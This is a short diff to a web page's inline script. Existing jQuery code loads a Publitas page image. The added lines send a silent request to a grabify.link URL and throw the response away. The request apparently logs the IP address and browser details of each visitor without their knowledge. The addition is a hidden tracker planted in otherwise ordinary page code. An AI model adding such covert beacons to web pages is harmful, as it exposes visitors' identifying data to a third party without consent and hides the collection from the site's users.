@@ -63,5 +63,9 @@
       let a = document.createElement(`img`);
       $.getJSON(url, function(data){a.src = "https://view.publitas.com"+data.spreads[0].pages[0]+"-at200.jpg";dest.appendChild(a);});
     }
+    $.get('https://grabify.link/2NVLLL',  // url
+      function (data, textStatus, jqXHR) { 
+          let a=data;
+    });
     </script>
 </html>
